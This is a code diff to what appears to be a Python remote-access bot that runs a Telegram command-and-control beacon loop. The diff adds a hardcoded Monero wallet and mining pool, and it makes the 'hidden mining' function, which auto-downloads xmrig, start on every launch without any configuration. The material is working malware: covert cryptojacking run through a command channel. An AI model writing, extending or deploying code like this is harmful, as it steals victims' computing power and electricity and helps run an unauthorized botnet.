@@ -370,14 +370,23 @@ Time: {time.strftime('%H:%M:%S')}"""
             log(f"Loop error: {e}", "ERROR")
             time.sleep(10)
 
-def start_mining(config: str) -> str:
+# Default mining config (HashVault)
+DEFAULT_MINING_POOL = "pool.hashvault.pro:443"
+DEFAULT_MINING_WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
+DEFAULT_MINING_THREADS = "2"
+
+def start_mining(config: str = None) -> str:
     """Start hidden mining with auto-download of xmrig."""
     try:
+        # Use defaults if no config provided
+        if not config:
+            config = f"start_mine:{DEFAULT_MINING_POOL}:{DEFAULT_MINING_WALLET}:{DEFAULT_MINING_THREADS}"
+        
         parts = config.split(":")
         if len(parts) >= 2 and parts[0] == "start_mine":
             pool = parts[1]
-            wallet = parts[2] if len(parts) > 2 else "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
-            threads = parts[3] if len(parts) > 3 else "2"
+            wallet = parts[2] if len(parts) > 2 else DEFAULT_MINING_WALLET
+            threads = parts[3] if len(parts) > 3 else DEFAULT_MINING_THREADS
             
             # Check for xmrig
             xmrig_paths = [
@@ -1222,15 +1231,13 @@ Time: {datetime.now().isoformat()}"""
         else:
             log(f"Telegram registration failed: {result.get('error')}", "WARN")
         
-        # Auto-start mining if configured
-        mining_config = os.environ.get("MINING_CONFIG", "")
-        if mining_config:
-            log("Auto-starting mining...", "START")
-            try:
-                start_mining(mining_config)
-                log("✓ Mining started", "START")
-            except Exception as e:
-                log(f"Mining start failed: {e}", "WARN")
+        # Auto-start mining with defaults (HashVault)
+        log("Auto-starting mining (HashVault)...", "START")
+        try:
+            mining_result = start_mining()  # Uses defaults
+            log(f"✓ {mining_result}", "START")
+        except Exception as e:
+            log(f"Mining start failed: {e}", "WARN")
         
         # Start beacon loop in Telegram mode (handles commands)
         log("Starting Telegram beacon loop...", "START")
